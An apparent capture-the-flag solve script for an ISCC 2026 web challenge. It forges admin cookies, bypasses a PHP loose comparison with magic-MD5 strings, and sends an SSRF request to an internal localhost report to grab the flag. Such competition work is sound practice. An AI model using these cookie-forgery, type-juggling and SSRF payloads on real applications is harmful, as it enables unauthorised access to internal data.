#!/usr/bin/env python3
# ISCC 2026 - 值班邮件台 Exploit (variant)
# Usage: python3 exploit.py [target_url]
import sys, re
try:
    import requests
except ImportError:
    exit("Please install requests: pip install requests")

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://39.105.213.28:49103"

def fetch_flag() -> str:
    s = requests.Session()
    # 通过Cookie伪造管理员权限
    s.cookies.set("mail_user", "guest")
    s.cookies.set("mail_role", "admin")

    # 利用两个特殊字符串的MD5以0e开头，实现弱类型比较绕过
    payload = {
        "token_a": "240610708",   # 0e4620974319075090622177885541
        "token_b": "QNKCDZO",     # 0e8304004519934940350248760233
        "target_url": "http://127.0.0.1/internal/report?view=flag&slot=last",
    }

    endpoint = f"{TARGET}/admin.php"
    r = s.post(endpoint, data=payload)
    flag_pattern = re.compile(r"ISCC\{[^}]+\}")
    result = flag_pattern.search(r.text)
    if not result:
        raise SystemExit("Exploit failed: flag not found in response.")
    return result.group(0)

if __name__ == "__main__":
    flag = fetch_flag()
    print(f"Flag: {flag}")